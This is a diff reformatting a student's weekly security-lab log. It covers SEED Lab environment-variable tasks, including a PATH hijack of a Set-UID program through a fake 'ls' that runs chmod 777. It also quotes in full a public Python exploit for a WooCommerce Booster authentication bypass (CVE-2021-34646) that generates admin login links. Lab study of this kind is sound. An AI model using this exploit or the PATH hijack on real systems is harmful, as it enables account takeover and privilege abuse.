@@ -1,4 +1,4 @@
-# Week #4
+# **Week #4**
 
 ## **SEEDs Lab**
 
@@ -20,38 +20,39 @@
 
 - **Conclusion:** The environment variables for a parent process and its child process, created through fork with default configuration, are the same
 
-**CODE**
+**Program**
 
-    #include <unistd.h>
-    #include <stdio.h>
-    #include <stdlib.h>
+``` c
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
 
-    extern char **environ;
+extern char **environ;
 
-    void printenv()
-    {
-      int i = 0;
-      while (environ[i] != NULL) {
-         printf("%s\n", environ[i]);
-         i++;
-      }
-    }
+void printenv()
+{
+  int i = 0;
+  while (environ[i] != NULL) {
+      printf("%s\n", environ[i]);
+      i++;
+  }
+}
 
-    void main()
-    {
-      pid_t childPid;
-      switch(childPid = fork()) {
-        case 0:  /* child process */
-          // printenv();          
-          exit(0);
-        default:  /* parent process */
-          printenv();       
-          exit(0);
-      }
-    }
+void main()
+{
+  pid_t childPid;
+  switch(childPid = fork()) {
+    case 0:  /* child process */
+      // printenv();          
+      exit(0);
+    default:  /* parent process */
+      printenv();       
+      exit(0);
+  }
+}
+```
 
-
-**TERMINAL**
+**Terminal**
 
 ![Terminal print of task 2](img/Week4/Task2-terminal.png)
 
@@ -63,26 +64,27 @@
 
 - When we changed this parameter for the pointer of the parent process's environment variables array (environ), the program's output was exactly that, the parent's process environment variables. This was expected, as those would be the child process's ones given we passed them through 'execve' third argument **(lines 2-*)**, thus confirming what was mentioned in the last point
 
-**CODE**
+**Program**
 
-    #include <unistd.h>
+``` c
+#include <unistd.h>
 
-    extern char **environ;
+extern char **environ;
 
-    int main()
-    {
-      char *argv[2];
+int main()
+{
+  char *argv[2];
 
-      argv[0] = "/usr/bin/env";
-      argv[1] = NULL;
+  argv[0] = "/usr/bin/env";
+  argv[1] = NULL;
 
-      execve("/usr/bin/env", argv, environ);  
+  execve("/usr/bin/env", argv, environ);  
 
-      return 0 ;
-    }
+  return 0 ;
+}
+```
 
-
-**TERMINAL**
+**Terminal**
 
 ![Terminal print of task 3](img/Week4/Task3-terminal.png)
 
@@ -93,18 +95,20 @@
 
 - The output was the parent process's environment variables, as expected, since the 'system' function uses 'execl', which in its turn calls 'execve' with the parent process's EVs, which finally executes /bin/sh with the argument passed to 'system'
 
-**CODE**
+**Program**
 
-    #include <stdio.h>
-    #include <stdlib.h>
+``` c
+#include <stdio.h>
+#include <stdlib.h>
 
-    int main()
-    {
-        system("/usr/bin/env");
-        return 0 ;
-    }
+int main()
+{
+    system("/usr/bin/env");
+    return 0 ;
+}
+```
 
-**TERMINAL**
+**Terminal**
 
 ![Terminal print of task 4](img/Week4/Task4-terminal.png)
 
@@ -115,20 +119,22 @@
 - Finally, as a normal user, changed some environment variables values and ran the program
 - Checking the output of the program, although the EVs values had changed, one of them was not present, which was a suprise
 
-**CODE**
+**Program**
 
-    #include <stdio.h>
-    #include <stdlib.h>
+``` c
+#include <stdio.h>
+#include <stdlib.h>
 
-    extern char **environ;
+extern char **environ;
 
-    int main() {
-        int i = 0;
-        while (environ[i] != NULL) {
-        printf("%s\n", environ[i]);
-        i++;
-        }
+int main() {
+    int i = 0;
+    while (environ[i] != NULL) {
+    printf("%s\n", environ[i]);
+    i++;
     }
+}
+```
 
 Terminal | Execution result
 :---------:|:---------:
@@ -142,29 +148,33 @@ Terminal | Execution result
 - Lastly, we compiled the program given and made it into a SET-UID program
 - When we ran the program, instead of a list of files in a directory, we saw the message "BOO!" printed on the screen and the permissions of an 'important_file' changed, meaning our version of ls was the one executed. This demonstrates the power of changing EVs
 
-**CODE OF THE PROGRAM TO RUN**
+**Program**
 
-    #include <stdio.h>
-    #include <stdlib.h>
+``` c
+#include <stdio.h>
+#include <stdlib.h>
 
-    int main()
-    {
-        system("ls");
-        return 0;
-    }
+int main()
+{
+    system("ls");
+    return 0;
+}
+```
 
-**CODE OF THE NEW LS CREATED IN /home/seed**
+**New ls in /home/seed**
 
-    #include <stdio.h>
-    #include <stdlib.h>
+``` c
+#include <stdio.h>
+#include <stdlib.h>
 
-    int main() {
+int main() {
 
-        printf("BOO!\n");
-        system("chmod 777 /home/seed/Documents/important_file");
+    printf("BOO!\n");
+    system("chmod 777 /home/seed/Documents/important_file");
 
-        return 0;
-    }
+    return 0;
+}
+```
 
 Creating new ls | Executing program given
 :---------:|:---------:
@@ -199,116 +209,117 @@ Executing new ls directly | Executing program given result
 
 #### **Search for an available exploit online**
 
-  * [Exploit](https://www.exploit-db.com/exploits/50299)
+* [Exploit](https://www.exploit-db.com/exploits/50299)
 
-        # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
-        # Date: 2021-09-16
-        # Exploit Author: Sebastian Kriesten (0xB455)
-        # Contact: https://twitter.com/0xB455
-        #
-        # Affected Plugin: Booster for WooCommerce
-        # Plugin Slug: woocommerce-jetpack
-        # Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
-        # Affected Versions: <= 5.4.3
-        # Fully Patched Version: >= 5.4.4
-        # CVE: CVE-2021-34646
-        # CVSS Score: 9.8 (Critical)
-        # Category: webapps
-        #
-        # 1:
-        # Goto: https://target.com/wp-json/wp/v2/users/
-        # Pick a user-ID (e.g. 1 - usualy is the admin)
-        #
-        # 2:
-        # Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
-        #
-        # 3:
-        # Check-Out  out which of the generated links allows you to access the system
-        #
-        import requests,sys,hashlib
-        import argparse
-        import datetime
-        import email.utils
-        import calendar
-        import base64  # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
-        # Date: 2021-09-16
-        # Exploit Author: Sebastian Kriesten (0xB455)
-        # Contact: https://twitter.com/0xB455
-        #
-        # Affected Plugin: Booster for WooCommerce
-        # Plugin Slug: woocommerce-jetpack
-        # Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
-        # Affected Versions: <= 5.4.3
-        # Fully Patched Version: >= 5.4.4
-        # CVE: CVE-2021-34646
-        # CVSS Score: 9.8 (Critical)
-        # Category: webapps
-        #
-        # 1:
-        # Goto: https://target.com/wp-json/wp/v2/users/
-        # Pick a user-ID (e.g. 1 - usualy is the admin)
-        #
-        # 2:
-        # Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
-        #
-        # 3:
-        # Check-Out  out which of the generated links allows you to access the system
-        #
-        import requests,sys,hashlib
-        import argparse
-        import datetime
-        import email.utils
-        import calendar
-        import base64
+``` python 
+# Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
+# Date: 2021-09-16
+# Exploit Author: Sebastian Kriesten (0xB455)
+# Contact: https://twitter.com/0xB455
+#
+# Affected Plugin: Booster for WooCommerce
+# Plugin Slug: woocommerce-jetpack
+# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
+# Affected Versions: <= 5.4.3
+# Fully Patched Version: >= 5.4.4
+# CVE: CVE-2021-34646
+# CVSS Score: 9.8 (Critical)
+# Category: webapps
+#
+# 1:
+# Goto: https://target.com/wp-json/wp/v2/users/
+# Pick a user-ID (e.g. 1 - usualy is the admin)
+#
+# 2:
+# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
+#
+# 3:
+# Check-Out  out which of the generated links allows you to access the system
+#
+import requests,sys,hashlib
+import argparse
+import datetime
+import email.utils
+import calendar
+import base64  # Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
+# Date: 2021-09-16
+# Exploit Author: Sebastian Kriesten (0xB455)
+# Contact: https://twitter.com/0xB455
+#
+# Affected Plugin: Booster for WooCommerce
+# Plugin Slug: woocommerce-jetpack
+# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
+# Affected Versions: <= 5.4.3
+# Fully Patched Version: >= 5.4.4
+# CVE: CVE-2021-34646
+# CVSS Score: 9.8 (Critical)
+# Category: webapps
+#
+# 1:
+# Goto: https://target.com/wp-json/wp/v2/users/
+# Pick a user-ID (e.g. 1 - usualy is the admin)
+#
+# 2:
+# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
+#
+# 3:
+# Check-Out  out which of the generated links allows you to access the system
+#
+import requests,sys,hashlib
+import argparse
+import datetime
+import email.utils
+import calendar
+import base64
 
-        B = "\033[94m"
-        W = "\033[97m"
-        R = "\033[91m"
-        RST = "\033[0;0m"
+B = "\033[94m"
+W = "\033[97m"
+R = "\033[91m"
+RST = "\033[0;0m"
 
-        parser = argparse.ArgumentParser()
-        parser.add_argument("url", help="the base url")
-        parser.add_argument('id', type=int, help='the user id', default=1)
-        args = parser.parse_args()
-        id = str(args.id)
-        url = args.url
-        if args.url[-1] != "/": # URL needs trailing /
-              url = url + "/"
+parser = argparse.ArgumentParser()
+parser.add_argument("url", help="the base url")
+parser.add_argument('id', type=int, help='the user id', default=1)
+args = parser.parse_args()
+id = str(args.id)
+url = args.url
+if args.url[-1] != "/": # URL needs trailing /
+      url = url + "/"
 
-        verify_url= url + "?wcj_user_id=" + id
-        r = requests.get(verify_url)
+verify_url= url + "?wcj_user_id=" + id
+r = requests.get(verify_url)
 
-        if r.status_code != 200:
-              print("status code != 200")
-              print(r.headers)
-              sys.exit(-1)
+if r.status_code != 200:
+      print("status code != 200")
+      print(r.headers)
+      sys.exit(-1)
 
-        def email_time_to_timestamp(s):
-          tt = email.utils.parsedate_tz(s)
-          if tt is None: return None
-          return calendar.timegm(tt) - tt[9]
+def email_time_to_timestamp(s):
+  tt = email.utils.parsedate_tz(s)
+  if tt is None: return None
+  return calendar.timegm(tt) - tt[9]
 
-        date = r.headers["Date"]
-        unix = email_time_to_timestamp(date)
+date = r.headers["Date"]
+unix = email_time_to_timestamp(date)
 
-        def printBanner():
-          print(f"{W}Timestamp: {B}" + date)
-          print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
-          print("We need to generate multiple timestamps in order to avoid delay related timing errors")
-          print("One of the following links will log you in...\n")
+def printBanner():
+  print(f"{W}Timestamp: {B}" + date)
+  print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
+  print("We need to generate multiple timestamps in order to avoid delay related timing errors")
+  print("One of the following links will log you in...\n")
 
-        printBanner()
+printBanner()
 
-        for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
-              hash = hashlib.md5(str(unix-i).encode()).hexdigest()
-              print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
-              token='{"id":"'+ id +'","code":"'+hash+'"}'
-              token = base64.b64encode(token.encode()).decode()
-              token = token.rstrip("=") # remove trailing =
-              link = url+"my-account/?wcj_verify_email="+token
-              print(link + f"\n{RST}")
+for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
+      hash = hashlib.md5(str(unix-i).encode()).hexdigest()
+      print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
+      token='{"id":"'+ id +'","code":"'+hash+'"}'
+      token = base64.b64encode(token.encode()).decode()
+      token = token.rstrip("=") # remove trailing =
+      link = url+"my-account/?wcj_verify_email="+token
+      print(link + f"\n{RST}")
 
-
+```
 
 #### **Exploit the Vulnerability**
 
